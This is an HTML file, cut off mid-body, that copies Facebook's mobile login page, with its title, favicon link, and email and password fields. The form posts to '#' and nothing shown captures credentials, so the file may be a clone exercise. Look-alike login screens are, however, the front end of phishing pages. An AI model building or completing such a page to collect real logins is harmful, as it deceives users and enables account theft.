<!DOCTYPE html>

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="style.css">
    <link rel="icon" type="image/x-icon" href="https://www.facebook.com/favicon.ico">
    <title>Facebook - log in or sign up</title>
</head>

<body>
    <div class="page">
        <div class="top-bar">
            <button class="back-btn">&#8249;</button>
        </div>

        <div class="main">
            <div class="logo-wrap">
                <div class="fb-icon">f</div>
            </div>

            <form action="#">
                <div class="input-group">
                    <input type="text" id="email" placeholder=" " required>
                    <label for="email">Mobile number or email address</label>
                </div>
                <div class="input-group">
                    <input type="password" id="password" placeholder=" " required>
                    <label for="password">Password</label>
                </div>
                <button type="submit" class="btn-login">Log in</button>
                <a href="#" class="forgot">Forgotten password?</a>
            </form>
        </div>

        <div class="bottom">
            <button class="btn-create">Create new account</button>
